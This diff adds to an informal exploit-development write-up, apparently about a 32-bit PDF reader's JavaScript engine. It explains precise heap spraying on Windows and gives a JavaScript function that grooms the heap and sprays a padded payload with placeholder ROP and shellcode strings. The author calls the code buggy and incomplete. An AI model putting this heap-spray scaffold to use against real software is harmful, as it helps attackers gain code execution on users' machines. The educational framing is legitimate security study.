@@ -52,4 +52,89 @@ Now the actual implementation of this was this one function gc(){
 	}
 }
 
-nothing new under the sun just wanted to point a quick fact about the implementation of this thing
+nothing new under the sun just wanted to point a quick fact about the implementation of this thing. Now there is another one more thing to talk about since the exploit is targeting a 32 bit software. On windows there is this concept of precise heap spray. So what is that ? On windows(i know it should be also doable on linux, i saw it only on windows) only you can allocate for 32bit space a predictable address every time. Honestly this is nothing new under the sun. It's something easy once you understand it , i did udnerstand it intriquetly once but now i dont :))). Now anyway so for windows 10 you are not allowed to do VirtualAlloc size for VABlocks 0x7fb0. But fortunatelly you can do a trick. You can do incrementally in size of 0x10000, 0x40000 and another size allocation and idk for 0x300 times. This allows you do to it . Againt nothing new under the sun if you know you know. Now here's the specific implementation.
+function store_shellcode() {
+	app.alert(util.printf("Uninitialized1"));
+
+	var offset 	  		= 0xbc4; //this will need adjustment aka be changed
+	var final_payload 		= "";
+	var junk 	  		= p32(0x50505050)+p32(0x80808080);
+	var rop  	  		= "4141424243434444454546464747";
+	var shellcode 		        = "0c0c00c0c0c0c0c0c0c0c0c0c0c0";
+	while(junk.length < 0x1000){
+		junk += junk;
+	}
+	app.alert(util.printf("Uninitialized2"));
+	app.alert("Preparing layout to allow application to store 'noise'");
+	
+	// Allocate a 0x1000-byte buffer and fill with 'A'
+	let hAlloc0 = new SharedArrayBuffer(0x1000);
+	fillBuffer(hAlloc0, 'A');
+	
+	// Allocate a 0x10000-byte buffer and fill with 'B'
+	let hAlloc1 = new SharedArrayBuffer(0x10000);
+	fillBuffer(hAlloc1, 'B');
+	
+	// Reallocate hAlloc0 with a new 0x1000-byte buffer filled with 'A'
+	hAlloc0 = new SharedArrayBuffer(0x1000);
+	fillBuffer(hAlloc0, 'A');
+	
+	// Allocate another 0x10000-byte buffer and fill with 'B'
+	let hAlloc2 = new SharedArrayBuffer(0x10000);
+	fillBuffer(hAlloc2, 'B');
+	
+	// Reallocate hAlloc0 again (0x1000-byte) and fill with 'A'
+	hAlloc0 = new SharedArrayBuffer(0x1000);
+	fillBuffer(hAlloc0, 'A');
+	
+	// Allocate a third 0x10000-byte buffer and fill with 'B'
+	let hAlloc3 = new SharedArrayBuffer(0x10000);
+	fillBuffer(hAlloc3, 'B');
+	
+	// Reallocate hAlloc0 once more with a new 0x1000-byte buffer filled with 'A'
+	hAlloc0 = new SharedArrayBuffer(0x1000);
+	fillBuffer(hAlloc0, 'A');
+	
+	app.alert("Layout created, now freeing 3 chunks of 0x10000");
+	
+	// Log and "free" the 0x10000-byte buffers by dropping references.
+	app.alert("Free", hAlloc1);
+	hAlloc1 = null;
+	
+	app.alert("Free", hAlloc2);
+	hAlloc2 = null;
+	
+	app.alert("Free", hAlloc3);
+	hAlloc3 = null;
+	
+	app.alert("Done. Ready for spray");
+
+	//Trigger the theoretical garbage collection to clear the heap.
+	gc();
+
+	final_payload =  junk.substring(0,offset);
+
+	final_payload += rop;
+
+	final_payload += shellcode;
+
+	final_payload += junk.substring(0,0x10000-offset-rop.length-shellcode.length);
+
+	while(final_payload.length < 0x40000){
+		final_payload += final_payload;
+	}
+ 
+  	var sprayRepeat = 3; // Repeat spray multiple times.
+  	var sprayCount = 0x900; // Number of spray entries per repetition.
+
+ 	for (var rep = 0; rep < sprayRepeat; rep++) {
+    		for (var i = 0; i < sprayCount; i++) {
+      			// Convert the first 0x40000 characters of final_payload into a SharedArrayBuffer.
+      			var sprayBuffer = allocateSprayBuffer(final_payload.substring(0, 0x40000));
+      			global_address_spray.push(sprayBuffer);
+    		}
+  	}
+	app.alert(util.printf("SPRAY DONE"));
+}
+
+Nothing new under the sun repeat same payload from 0x10000 to another 0x10000 till you form a 0x40000 hex len string and than literally spray it . Now i have to mention that this is somewhat buggy cause while it spray a lot and from time to time we manage to get a precise address, this needs a little bit of optimisation/ improvement cause oh well i forgot how you do this thing exactly.  Insert windbg image and some explanation on what i see 
